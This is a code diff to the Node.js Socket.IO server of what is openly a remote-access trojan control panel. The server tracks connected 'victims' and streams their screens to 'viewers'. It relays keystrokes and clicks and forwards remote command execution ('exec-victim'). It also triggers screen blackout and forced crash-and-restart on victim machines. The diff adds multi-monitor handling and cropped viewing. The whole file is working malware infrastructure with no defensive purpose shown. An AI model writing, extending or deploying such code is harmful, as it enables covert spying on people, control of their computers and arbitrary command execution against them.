@@ -16,12 +16,10 @@ const io = new Server(server, {
 const PORT = process.env.PORT || 8080;
 
 // ── State ──
-const victims = new Map();        // victimId -> { socket, w, h, connectedAt }
+const victims = new Map();        // victimId -> { socket, w, h, connectedAt, monitors }
 const viewers = new Map();        // socket -> { viewing: victimId }
 const frameStreams = new Map();   // victimId -> Set<viewerSockets>
-const victimActivity = new Map(); // victimId -> lastFrameAt (for keepalive)
 
-// ── Serve client HTML ──
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "client.html"));
 });
@@ -30,34 +28,30 @@ app.get("/healthz", (req, res) => {
   res.status(200).send("OK");
 });
 
-// ── Socket.IO ──
 io.on("connection", (socket) => {
   console.log(`[+] Connection: ${socket.id}`);
 
-  // ═══════════════════════════════════════════════════
-  // VICTIM REGISTRATION
-  // ═══════════════════════════════════════════════════
+  // ══════════════════════════════════════
+  // VICTIM
+  // ══════════════════════════════════════
   socket.on("register-victim", (data) => {
     const victimId = data.id || socket.id;
     victims.set(victimId, {
       socket,
       w: data.w || 1920,
       h: data.h || 1080,
+      monitors: data.monitors || [{ w: data.w || 1920, h: data.h || 1080, x: 0, y: 0, primary: true }],
       connectedAt: Date.now()
     });
     socket.victimId = victimId;
-        socket.role = "victim";
+    socket.role = "victim";
 
-    console.log(`[VICTIM ONLINE] ${victimId} (${data.w}x${data.h})`);
-
-    // Notify all viewers
+    console.log(`[VICTIM ONLINE] ${victimId} (${data.w}x${data.h}, ${(data.monitors || []).length} monitors)`);
     broadcastVictimList();
 
-    // ── Frame forwarding (only if someone is watching) ──
     socket.on("frame", (frameData) => {
-          const stream = frameStreams.get(victimId);
+      const stream = frameStreams.get(victimId);
       if (stream && stream.size > 0) {
-        victimActivity.set(victimId, Date.now());
         stream.forEach((viewerSocket) => {
           if (viewerSocket.connected) {
             viewerSocket.emit("frame", { victimId, buf: frameData.buf });
@@ -65,26 +59,20 @@ io.on("connection", (socket) => {
             stream.delete(viewerSocket);
           }
         });
-          }
-    });
-
-    // ── Blackout status forwarding ──
-    socket.on("blackout-status", (data) => {
-      const stream = frameStreams.get(victimId);
-      if (stream) {
-        stream.forEach((vs) => {
-          if (vs.connected) vs.emit("blackout-status", data);
-        });
       }
     });
 
-    // ── Exec result forwarding ──
+    socket.on("blackout-status", (data) => {
+      const stream = frameStreams.get(victimId);
+      if (stream) {
+        stream.forEach((vs) => { if (vs.connected) vs.emit("blackout-status", data); });
+      }
+    });
+
     socket.on("exec-result", (data) => {
       const stream = frameStreams.get(victimId);
       if (stream) {
-        stream.forEach((vs) => {
-          if (vs.connected) vs.emit("exec-result", data);
-        });
+        stream.forEach((vs) => { if (vs.connected) vs.emit("exec-result", data); });
       }
     });
 
@@ -92,24 +80,23 @@ io.on("connection", (socket) => {
       console.log(`[VICTIM OFFLINE] ${victimId}`);
       victims.delete(victimId);
       frameStreams.delete(victimId);
-      victimActivity.delete(victimId);
       broadcastVictimList();
     });
   });
 
-  // ═══════════════════════════════════════════════════
-  // VIEWER (browser) REGISTRATION
-  // ═══════════════════════════════════════════════════
+  // ══════════════════════════════════════
+  // VIEWER
+  // ══════════════════════════════════════
   socket.on("register-viewer", () => {
     socket.role = "viewer";
     viewers.set(socket, { viewing: null });
     console.log(`[VIEWER ONLINE] ${socket.id}`);
-
-    // Send victim list immediately
     socket.emit("victim-list", getVictimList());
 
-    // ── Select victim to view ──
-    socket.on("select-victim", (victimId) => {
+    socket.on("select-victim", (data) => {
+      const victimId = typeof data === "string" ? data : data.id;
+      const crop = data.crop || null;  // { x, y, w, h } or null for full desktop
+      
       const victim = victims.get(victimId);
       if (!victim) {
         socket.emit("error", { msg: "Victim not available" });
@@ -131,27 +118,33 @@ io.on("connection", (socket) => {
         }
       }
 
-      // Subscribe to new victim
+      // Subscribe
       viewers.set(socket, { viewing: victimId });
       if (!frameStreams.has(victimId)) {
         frameStreams.set(victimId, new Set());
       }
       frameStreams.get(victimId).add(socket);
 
-      // Tell victim someone is watching
+      // Tell victim about viewer count + crop settings
       victim.socket.emit("viewer-count", frameStreams.get(victimId).size);
+      if (crop) {
+        victim.socket.emit("set-crop", crop);
+      } else {
+        victim.socket.emit("set-crop", null); // full desktop
+      }
 
-      // Send victim info to viewer
+      // Send victim info with monitor list
       socket.emit("victim-info", {
         id: victimId,
-        w: victim.w,
-        h: victim.h
+        w: crop ? crop.w : victim.w,
+        h: crop ? crop.h : victim.h,
+        monitors: victim.monitors,
+        crop: crop
       });
 
-      console.log(`[VIEWING] ${socket.id} -> ${victimId}`);
+      console.log(`[VIEWING] ${socket.id} -> ${victimId}${crop ? ' (cropped)' : ''}`);
     });
 
-    // ── Click ──
     socket.on("click", (data) => {
       const viewer = viewers.get(socket);
       if (!viewer || !viewer.viewing) return;
@@ -161,7 +154,6 @@ io.on("connection", (socket) => {
       }
     });
 
-    // ── Key ──
     socket.on("key", (key) => {
       const viewer = viewers.get(socket);
       if (!viewer || !viewer.viewing) return;
@@ -171,13 +163,9 @@ io.on("connection", (socket) => {
       }
     });
 
-    // ── Blackout toggle ──
     socket.on("toggle-blackout", (state) => {
       const viewer = viewers.get(socket);
-      if (!viewer || !viewer.viewing) {
-        socket.emit("error", { msg: "No victim selected" });
-        return;
-      }
+      if (!viewer || !viewer.viewing) { socket.emit("error", { msg: "No victim selected" }); return; }
       const victim = victims.get(viewer.viewing);
       if (victim && victim.socket.connected) {
         victim.socket.emit("blackout", state);
@@ -186,13 +174,9 @@ io.on("connection", (socket) => {
       }
     });
 
-    // ── Crash & restart ──
     socket.on("trigger-crash", () => {
       const viewer = viewers.get(socket);
-      if (!viewer || !viewer.viewing) {
-        socket.emit("error", { msg: "No victim selected" });
-        return;
-      }
+      if (!viewer || !viewer.viewing) { socket.emit("error", { msg: "No victim selected" }); return; }
       const victim = victims.get(viewer.viewing);
       if (victim && victim.socket.connected) {
         victim.socket.emit("crash-and-restart");
@@ -202,13 +186,9 @@ io.on("connection", (socket) => {
       }
     });
 
-    // ── Execute command on victim ──
     socket.on("exec-victim", (cmd) => {
       const viewer = viewers.get(socket);
-      if (!viewer || !viewer.viewing) {
-        socket.emit("error", { msg: "No victim selected" });
-        return;
-      }
+      if (!viewer || !viewer.viewing) { socket.emit("error", { msg: "No victim selected" }); return; }
       const victim = victims.get(viewer.viewing);
       if (victim && victim.socket.connected) {
         victim.socket.emit("exec", cmd);
@@ -217,11 +197,8 @@ io.on("connection", (socket) => {
       }
     });
 
-    // ── Request victim list refresh ──
     socket.on("get-victims", () => {
-      if (socket.role === "viewer") {
-        socket.emit("victim-list", getVictimList());
-      }
+      if (socket.role === "viewer") socket.emit("victim-list", getVictimList());
     });
 
     socket.on("disconnect", () => {
@@ -233,9 +210,7 @@ io.on("connection", (socket) => {
           stream.delete(socket);
           if (stream.size === 0) {
             const victim = victims.get(viewer.viewing);
-            if (victim) {
-              victim.socket.emit("viewer-count", 0);
-            }
+            if (victim) victim.socket.emit("viewer-count", 0);
           }
         }
       }
@@ -251,6 +226,7 @@ function getVictimList() {
       id,
       w: victim.w,
       h: victim.h,
+      monitors: victim.monitors,
       connectedAt: victim.connectedAt
     });
   }
@@ -260,9 +236,7 @@ function getVictimList() {
 function broadcastVictimList() {
   const list = getVictimList();
   for (const [socket] of viewers) {
-    if (socket.connected) {
-      socket.emit("victim-list", list);
-    }
+    if (socket.connected) socket.emit("victim-list", list);
   }
 }
 
